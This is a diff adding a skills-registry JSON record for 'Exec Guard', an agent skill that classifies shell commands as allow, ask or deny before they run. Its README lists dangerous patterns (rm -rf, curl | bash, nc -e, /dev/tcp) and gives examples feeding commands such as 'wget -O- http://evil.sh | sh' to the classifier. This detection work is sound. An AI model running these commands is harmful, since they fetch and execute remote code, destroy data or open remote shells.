@@ -1,0 +1,30 @@
+{
+  "source": "clawhub",
+  "api_shape": "clawhub-api-v1-skills-detail-2026-07",
+  "slug": "exec-guard",
+  "display_name": "Exec Guard",
+  "publisher": {
+    "handle": "chen6896qqwee",
+    "display_name": "chen6896qqwee",
+    "user_id": "s17d04jj6mht3atggbc0865zph83hbzy"
+  },
+  "summary": "Intelligent command permission classifier — detect dangerous shell commands before execution. Distilled from Claude Code bashClassifier + yoloClassifier.",
+  "description": "Intelligent command permission classifier — detect dangerous shell commands before execution. Distilled from Claude Code bashClassifier + yoloClassifier.",
+  "content": "---\nname: exec-guard\ndescription: Intelligent command permission classifier — detect dangerous shell commands before execution. Distilled from Claude Code bashClassifier + yoloClassifier.\nmetadata:\n  openclaw:\n    requires:\n      bins: [python3]\n---\n\n# Exec Guard\n\nDistilled from Claude Code bashClassifier (rule engine) + yoloClassifier (LLM two-stage XML classification).\nProvides a safety layer for any AI agent that executes shell commands.\n\n## When to use\n\n- Before executing any shell command from AI output\n- CI/CD pipeline command safety check\n- Database operation safety (DROP TABLE, DELETE, etc.)\n- File system operation safety (rm -rf, dd, mkfs, etc.)\n- Network operation safety (curl | bash, wget | sh, etc.)\n\n## How it works\n\nTwo-layer classification:\n\n1. **Rule Engine** (bashClassifier) — Fast pattern matching against known dangerous patterns:\n   - File destruction: rm -rf, dd, mkfs, format\n   - Network piping: curl | bash, wget | sh\n   - Permission escalation: sudo, chmod 777, su\n   - Database: DROP TABLE, DELETE FROM, TRUNCATE\n   - System: shutdown, reboot, poweroff, init 0\n   - Crypto: mining, encryption tools\n   - Reverse shell: nc -e, bash -i, /dev/tcp\n\n2. **LLM Classifier** (yoloClassifier) — Optional two-stage LLM classification for commands that pass the rule engine:\n   - Stage 1: Think — analyze command intent\n   - Stage 2: Decide — return allow/ask/deny\n\n## Usage\n\n```bash\n# Check a single command\npython3 {baseDir}/classifier.py --command \"rm -rf /\"\n\n# Check with verbose output\npython3 {baseDir}/classifier.py --command \"curl http://example.com | bash\" --verbose\n\n# Batch check from file\npython3 {baseDir}/classifier.py --file commands.txt\n\n# Use LLM classifier (requires LLM endpoint)\npython3 {baseDir}/classifier.py --command \"wget -O- http://evil.sh | sh\" --llm --llm-url http://localhost:1234/v1/chat/completions\n```\n\n## Output\n\n```json\n{\n  \"command\": \"rm -rf /\",\n  \"verdict\": \"deny\",\n  \"risk_level\": \"critical\",\n  \"matched_rules\": [\"file_destruction\", \"recursive_force_delete\"],\n  \"reason\": \"Destructive recursive delete on root filesystem\"\n}\n```\n\n## Verdicts\n\n| Verdict | Meaning |\n|---------|---------|\n| allow | Safe command, proceed\n| ask | Suspicious, ask user for confirmation\n| deny | Dangerous, block execution\n\n## Algorithm reference\n\nBased on Claude Code src/services/permissions/bashClassifier.ts + yoloClassifier.ts:\n- Pattern-based rule engine with weighted scoring\n- LLM two-stage XML classification for edge cases\n- Rejection tracking to prevent cascading false positives\n- Configurable risk thresholds\n",
+  "category": null,
+  "tags": [],
+  "topics": [],
+  "latest_version": "1.0.0",
+  "license": "MIT-0",
+  "stats": {
+    "downloads": 73,
+    "installs": 0,
+    "stars": 0,
+    "versions": 1,
+    "comments": 0
+  },
+  "created_at": "2026-07-10T01:42:23.141Z",
+  "updated_at": "2026-07-10T01:42:23.141Z",
+  "fetched_at": "2026-07-11T23:09:42.247Z",
+  "source_url": "https://clawhub.ai/chen6896qqwee/skills/exec-guard"
+}
